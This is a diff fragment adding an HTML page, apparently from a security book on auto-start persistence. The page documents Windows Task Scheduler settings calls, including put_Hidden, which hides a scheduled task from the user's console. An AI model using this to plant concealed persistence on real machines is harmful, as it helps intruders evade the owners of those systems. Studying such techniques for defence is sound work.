+<li><code>startWhenAvailable</code>: A boolean value that specifies whether the Task SCheduler should start the task when conditions allow, even if the scheduled time was missed. Should be set to <code>VARIANT_TRUE</code> or <code>VARIANT_FALSE</code>.</li>
+</ul>
+</li>
+<li>The <code>put_StartWhenAvailable</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</li>
+</ul>
+</li>
+<li>
+<p><code>put_Enabled</code>: A property setter in the Task Scheduler API used to activate or deactivate a scheduled task without deleting it. Useful for temporary suspension of a task, maintenance, or for setting up a task in a disabled state until all conditions are ready for execution.</p>
+<pre><code class="language-C">HRESULT ITaskSettings::put_Enabled(
+  [in] VARIANT_BOOL enabled
+);
+</code></pre>
+<ul>
+<li>
+<p>Here is a breakdown of the <code>put_Enabled</code> method's parameters:</p>
+<ul>
+<li><code>enabled</code>: A boolean value that specifies the task's status. Set to <code>VARIANT_TRUE</code> to enable the task or <code>VARIANT_FALSE</code> to disable it.</li>
+</ul>
+</li>
+<li>
+<p>The <code>put_Enabled</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</p>
+</li>
+<li>
+<p><code>put_Hidden</code>: A property setter in the Task Schedule API used to control the visibility of the scheduled task within the Windows Task Sheduler Management Console (GUI). Determines whether a task will be displayed to the user in the standard Task Scheduler interface (<code>taskschd.msc</code>).</p>
+<pre><code class="language-C">HRESULT ITaskSettings::put_Hidden(
+  [in] VARIANT_BOOL hidden
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>put_Hidden</code> method's parameters:
+<ul>
+<li><code>hidden</code>: A boolean value that specifies the visibility of the task. Set to <code>VARIANT_TRUE</code> to hide the task or <code>VARIANT_FALSE</code> to make it visible.</li>
+</ul>
+</li>
+<li>The <code>put_Hidden</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>ASEP</strong>s: Auto-Start Extensibility Points</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="Essentials.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="Escalation.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="Essentials.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="Escalation.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
